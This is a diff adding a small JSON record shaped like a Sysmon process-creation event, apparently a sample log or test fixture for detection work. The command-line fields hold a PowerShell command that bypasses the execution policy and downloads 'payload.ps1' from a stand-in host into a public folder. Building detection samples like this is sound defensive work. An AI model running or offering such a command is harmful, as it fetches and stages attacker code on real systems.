@@ -1,0 +1,10 @@
+{
+  "EventID": 1,
+  "UtcTime": "2026-06-30 10:20:11.123",
+  "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+  "CommandLine": "powershell.exe -ExecutionPolicy Bypass -NoProfile -Command Invoke-WebRequest http://example.com/payload.ps1 -OutFile C:\\Users\\Public\\payload.ps1",
+  "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+  "ParentCommandLine": "cmd.exe /c powershell.exe -ExecutionPolicy Bypass -NoProfile -Command Invoke-WebRequest http://example.com/payload.ps1 -OutFile C:\\Users\\Public\\payload.ps1",
+  "User": "WORKSTATION\\user01",
+  "Computer": "WORKSTATION01"
+}
